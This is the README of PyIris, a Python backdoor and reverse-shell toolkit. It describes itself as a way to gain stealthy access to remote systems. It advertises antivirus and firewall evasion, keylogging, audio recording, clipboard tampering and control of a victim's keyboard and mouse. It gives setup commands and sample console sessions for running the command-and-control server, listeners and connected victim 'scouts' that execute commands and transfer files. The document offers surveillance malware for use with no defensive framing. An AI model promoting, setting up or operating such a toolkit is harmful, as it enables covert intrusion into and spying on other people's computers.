<p float="left">
  <img src="https://user-images.githubusercontent.com/32593795/33884151-8f69ad80-df79-11e7-846e-3b766d4a9f0d.png" width="200" />
</p>

# PyIris
PyIris (the shortened name of Python-Iris), is a post exploitation, reverse shell, backdoor toolkit used in order to gain access onto 
remote systems stealthily. PyIris utilises cross-platform, reverse TCP payloads that can effectively evade modern antivirus, firewalls 
and user detection even after being compiled into executable files.

# Screenshots
<p float="left">
  <img src="https://user-images.githubusercontent.com/32593795/34034428-6cd68a44-e1b9-11e7-9dd0-ddc548742a1b.png" /> 
  <img src="https://user-images.githubusercontent.com/32593795/34034429-6d0f375e-e1b9-11e7-9069-ad39fe13194e.png" />
</p>

# Features
- Can bypass firewalls and antivirus
- Cross-platform support
- Remote command execution
- File transfers
- Dump the contents of a word document(view the typed text)
- Control victims keyboard
- Disable victims keyboard/mouse
- View, clear and edit victims clipboard
- Control Mouse movement and Mouse clicks of victim
- Screenshotting
- Keylogging
- List all currently open windows
- List all connected drives
- Record audio from victims computer
- Set audio levels without user noticing
- Get screen dimensions
- Get current mouse position
- toggle whether cmd/powershell executes shell command(Windows)
- choose which system shell executes shell command eg. /bin/bash, /bin/sh, /bin/ksh...(Linux)
- Kill/disconnect/sleep scout payloads
- Manage and connect to multiple scout payloads
- Locally run system shell commands
- Robust built-in scout payload failsafes to recover from network connection loss

# PyIris' Arsenal
## Handler
The handler is the command and control server of PyIris, it manages listeners and scouts. It's aim is to provide an easy to use 
interface to allow the user to communicate and command the various payloads deployed onto remote systems and the various active 
listeners.
## Listener
The main aim of the listener is to sit and wait for the payloads to connect back to the command and control server. The listener 
refers to a "server key" that each payload is outfitted with. If the payload sends the correct key to the server it is granted access, 
otherwise the connection is torn down and rejected.
## Scouts
These are the payloads that connect back to the handler. They are scripted in python and can be compiled into stealthy evasive 
executable files. Each payload has its own core function such as remote code execution, input injection, cyber reconnaissance and so on. 
These scouts can be easily deployed, each has an ip_addr and port variable that tell it where to connect back to, these are modified and 
then deployed, either as exectuables or .py files which attempt to connect back to the server.

# Getting Started
## Prerequisites
- Python 2.7
- Python pip
- Git
## Setup(Linux)
Run the following commands as root user, try running ```sudo -i``` first to become root.

```git clone https://github.com/angus-y/PyIris-backdoor```

```pip install python3-xlib```

```apt-get install scrot```

```apt-get install python3-tk```

```apt-get install python3-dev```

```apt-get install portaudio19-dev```

```apt-get install python-alsaaudio```

```apt-get install python-wnck```

```cd PyIris-backdoor```

```pip install -r linux_requirements.txt```

## Setup(Windows)
To git clone on windows you need to have the [Git bash shell](https://www.atlassian.com/git/tutorials/install-git) installed.

```git clone https://github.com/angus-y/PyIris-backdoor```

```cd PyIris-backdoor```

```C:\Python27\Scripts\pip install -r windows_requirements.txt```

The path does not have to be the one mentioned above, use the absolute path to your version of pip2.

## Updating PyIris
PyIris is a project undergoing heavy development and debugging, make sure to update often by running these commands in the PyIris
folder. Check out CHANGELOG.md in the repo to see whats new, whats removed and whats fixed.

```sudo git pull```

```pip install -r linux_requirements.txt/windows_requirements.txt```

The pip install depends on your operating system(Windows/Linux).

## Recommended OS
PyIris was installed succesfully on the following Operating Systems.

- Windows 10
- Ubuntu 16.04
- Kali Linux 2017.2

If you are runnning a different operating system and have trouble installing please contact me and let me know. (See title below Bugs, Suggestions or inquiries)
# Basic Usage
Change directory to the PyIris root folder first.
## Running the server in Windows cmd/powershell
```py -2 PyIris.py```
## Running the server in Linux terminal
```sudo python2 PyIris.py```
## Setting up the listener
Setting up a listener is simple, navigate to the listeners handler and start a listener on a free port. Run ```start <port number>``` to 
set up a listener. To view any active listeners run ```show``` . Use ```help``` to view all available commands.

```
PyIris > listeners
[+]Switching...
PyIris (Listeners) > start 9999
[+]Listener started and bound to port : 9999
PyIris (Listeners) > show

[*]Currently active listeners :

ID      Port
==      ====
1       9999
```

The scouts by default connect to port 9999 but this can be changed in the port variable.

## Managing and interacting with Scouts
To return to the default/root mode, run ```back```. Then enter the scouts handler by running ```scouts```. Once a scout connects back, 
run ```show``` to view all connected scouts and stats. Use ```help``` to view all available commands.

```
PyIris (Listeners) > back

[+]Returning...
PyIris > scouts
[+]Switching...
PyIris (Scouts) > show

[*]Currently active scouts :

ID      IP              User info               Type of scout   Operating System
==      ==              =========               =============   ================
1       127.0.0.1       DELL-LAPTOP/angus       Command Shell   Windows-10-10.0.15063
2       192.168.0.100   ubuntu/angus            Input Injector  Linux-4.10.0-38-generic-x86_64-with-Ubuntu-16.04-xenial
```

To interact with a scout run ```bridge <ID of scout>``` in the scouts handler.
Once an interaction with a scout has been started you can run ```help``` to view all of the payloads available commands.

```
PyIris (Scouts) > bridge 1
[+]Bridged to scout of ID : 1
PyIris (Command Shell) > help

Command Shell Menu
==================

   Global Commands :
      banner                            Display a banner
      help                              Show the help menu
      quit                              Quit the console
      clear                             Clear the screen

   Connection commands :
      disconnect                        Make the scout disconnect and try to reconnect
      terminate                         Kill tbe scout process
      sleep <seconds>                   Disconnect the scout and make it sleep for some time

   Command Shell Commands :
      exec <shell command>              Executes shell command and returns output
      exec_file <file/executable>       Executes a file/executable without blocking
      toggle                            toggle whether commands are run by powershell or cmd

   File Commands :
      download <filepath>               Download file
      dump <filepath>                   Dump and view file content(supports .docx file)
      upload <filepath>                 Upload a file
      web_download <url>                Download a file through a url
```

# Built with
- [PyCharm IDE](https://www.jetbrains.com/pycharm/)
- Logo made with [Adobe Illustrator CC 2018](http://www.adobe.com/sea/products/illustrator.html)

# Bugs, suggestions or inquiries?
- Create an issue
- Email me at 1010angusx@gmail.com

# Credits
- Inspired by [Powershell Empire](https://github.com/EmpireProject/Empire) and [Brain Damage](https://github.com/mehulj94/BrainDamage)

# License
Licensed under Mozilla Public License Version 2.0.
